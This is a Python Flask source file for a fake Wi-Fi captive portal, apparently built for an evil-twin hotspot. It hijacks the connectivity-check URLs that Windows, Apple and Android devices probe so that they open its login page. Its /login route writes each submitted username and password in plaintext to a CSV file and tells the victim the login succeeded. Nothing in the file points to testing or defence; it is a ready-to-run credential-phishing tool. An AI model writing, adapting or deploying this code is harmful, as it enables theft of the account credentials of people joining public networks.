from flask import Flask, request, render_template
import csv
import os

app = Flask(__name__)

LOG_FILE = os.path.join(os.path.dirname(__file__), '..', 'data', 'logins.csv')

@app.route('/connecttest.txt')
def connecttest():
    return "OK", 200

@app.route('/msftconnecttest/connecttest.txt')
def msftconnect():
    return "", 204   # Return empty 204 to signal “login required”


@app.route('/')
def home():
    return render_template('index.html')

@app.route('/ncsi.txt')
def ncsi():
    return "OK", 200

@app.route('/hotspot-detect.html')
@app.route('/success.html')
@app.route('/generate_204')
def portal_redirect():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    with open(LOG_FILE, 'a', newline='') as f:
        writer = csv.writer(f)
        writer.writerow([username, password])

    return "Login successful. Thank you."

if __name__ == '__main__':
    if not os.path.exists(LOG_FILE):
        with open(LOG_FILE, 'w', newline='') as f:
            writer = csv.writer(f)
            writer.writerow(['Username', 'Password'])

    app.run(host='0.0.0.0', port=80, debug=False)
